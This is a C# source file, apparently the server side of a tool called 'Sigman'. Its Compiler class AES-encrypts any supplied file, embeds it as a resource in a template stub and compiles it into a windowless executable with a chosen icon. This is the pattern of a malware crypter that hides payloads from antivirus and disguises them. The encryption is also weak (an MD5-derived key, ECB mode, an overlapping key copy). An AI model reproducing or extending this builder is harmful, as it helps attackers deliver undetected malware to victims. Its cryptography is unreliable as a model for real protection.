using System;
using System.IO;
using System.Text;
using System.Resources;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.Security.Cryptography;
using Microsoft.CSharp;

namespace Sigman.Server.Server {
    public class Compiler {

        public static bool CreateStub(string uniqueKey, string key, string file) {
            var source = File.ReadAllText("Stub.cs");

            source = source.Replace("[key-replace]", key);

            var fileBytes = File.ReadAllBytes(file);
            var encryptedBytes = AESEncrypt(fileBytes, key);

            var resFile = Path.Combine(Environment.CurrentDirectory, "Encrypted.resources");

            using (var writer = new ResourceWriter(resFile)) {
                writer.AddResource("encfile", encryptedBytes);
                writer.Generate();
            }

            bool result;

            if (File.Exists($"./{uniqueKey}/icon.ico")) {
                result = CompileFromSource(source, $"./{uniqueKey}/output.exe", $"./{uniqueKey}/icon.ico", new string[] { resFile });
            }
            else {
                result = CompileFromSource(source, $"./{uniqueKey}/output.exe", null, new string[] { resFile });
            }

            File.Delete(resFile);

            return result;
        }

        private static byte[] AESEncrypt(byte[] input, string Pass) {
            var hash = new byte[32];
            var aes = new RijndaelManaged();
            var temp = new MD5CryptoServiceProvider().ComputeHash(Encoding.ASCII.GetBytes(Pass));

            Array.Copy(temp, 0, hash, 0, 16);
            Array.Copy(temp, 0, hash, 15, 16);

            aes.Key = hash;
            aes.Mode = CipherMode.ECB;

            var encrypter = aes.CreateEncryptor();

            return encrypter.TransformFinalBlock(input, 0, input.Length);
        }

        private static bool CompileFromSource(string source, string output, string icon = null, string[] resources = null) {
            var parameters = new CompilerParameters {
                GenerateExecutable = true,
                OutputAssembly = output
            };

            var options = "/optimize+ /platform:x86 /target:winexe /unsafe";

            if (icon != null) {
                options += " /win32icon:\"" + icon + "\"";
            }

            parameters.CompilerOptions = options;
            parameters.TreatWarningsAsErrors = false;

            parameters.ReferencedAssemblies.Add("System.dll");
            parameters.ReferencedAssemblies.Add("System.Runtime.dll");
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            parameters.ReferencedAssemblies.Add("System.Data.dll");
            parameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");

            if (resources != null && resources.Length > 0) {
                foreach (var res in resources) {
                    parameters.EmbeddedResources.Add(res);
                }
            }

            var provider = new Dictionary<string, string> {
                { "CompilerVersion", "v4.0" }
            };

            var results = new CSharpCodeProvider(provider).CompileAssemblyFromSource(parameters, source);

            return results.Errors.Count <= 0;
        }
    }
}